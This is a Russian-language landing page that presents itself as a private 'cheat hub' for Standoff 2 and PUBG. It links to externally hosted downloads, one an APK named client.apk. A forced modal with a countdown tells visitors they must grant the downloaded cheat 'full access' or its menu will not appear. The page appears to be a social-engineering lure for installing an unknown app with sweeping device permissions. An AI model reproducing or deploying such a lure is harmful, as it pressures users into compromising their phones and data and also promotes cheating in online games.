<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Standoff 2 Cheat HUB</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0f0f0f;
      color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
    }

    .container {
      width: 90%;
      max-width: 400px;
      background: #1a1a1a;
      padding: 30px 20px;
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
    }

    h1 {
      color: #00ffcc;
      margin-bottom: 20px;
      font-size: 24px;
    }

    p {
      color: #bbbbbb;
      font-size: 16px;
    }

    .download-btn {
      display: inline-block;
      width: 100%;
      margin-top: 15px;
      padding: 12px;
      background-color: #00cc99;
      color: #fff;
      border-radius: 10px;
      font-weight: bold;
      font-size: 16px;
      text-decoration: none;
      transition: background-color 0.3s ease;
      cursor: pointer;
      box-sizing: border-box;
    }

    .download-btn:hover {
      background-color: #00b386;
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.7);
    }

    .modal-content {
      background-color: #1a1a1a;
      margin: 15% auto;
      padding: 30px;
      border-radius: 15px;
      width: 90%;
      max-width: 400px;
      color: #fff;
      text-align: center;
      box-shadow: 0 0 20px #00ffcc;
    }

    .modal-content p {
      margin-bottom: 20px;
    }

    #confirmBtn {
      background-color: #00cc99;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      color: white;
      font-weight: bold;
      cursor: not-allowed;
      opacity: 0.6;
    }

    #confirmBtn.enabled {
      cursor: pointer;
      opacity: 1;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Standoff 2 Cheat HUB</h1>
    <p>Добро пожаловать в приватный хаб читов.<br>Скачай нужный чит ниже:</p>

    <span class="download-btn" onclick="showModal('standoff')">Standoff</span>
    <span class="download-btn" onclick="showModal('pubg')">PUBG</span>
  </div>

  <!-- Модальное окно -->
  <div id="infoModal" class="modal">
    <div class="modal-content">
      <p>
        ⚠️ <strong>Уведомление:</strong><br>
        После запуска чита ОБЯЗАТЕЛЬНО дайте полный доступ, ИНАЧЕ ЧИТ-МЕНЮ НЕ БУДЕТ ОТОБРАЖАТЬСЯ!
      </p>
      <button id="confirmBtn" disabled>Подождите 10 секунд...</button>
    </div>
  </div>

  <script>
    let downloadLinks = {
      standoff: "https://pixeldrain.com/u/WuJKY1QP",
      pubg: "https://www.mediafire.com/file/nmtm3vdg7alaetl/client.apk/file"
    };

    function showModal(game) {
      document.getElementById('infoModal').style.display = 'block';
      let btn = document.getElementById('confirmBtn');
      let seconds = 10;
      btn.innerText = `Подождите ${seconds} секунд...`;
      btn.disabled = true;
      btn.classList.remove('enabled');

      let countdown = setInterval(() => {
        seconds--;
        if (seconds > 0) {
          btn.innerText = `Подождите ${seconds} секунд...`;
        } else {
          clearInterval(countdown);
          btn.innerText = "Я понял";
          btn.disabled = false;
          btn.classList.add('enabled');
          btn.onclick = () => {
            window.location.href = downloadLinks[game];
          };
        }
      }, 1000);
    }

    // Закрытие по нажатию вне модального окна
    window.onclick = function(event) {
      let modal = document.getElementById('infoModal');
      if (event.target === modal) {
        modal.style.display = "none";
      }
    }
  </script>
</body>
</html>
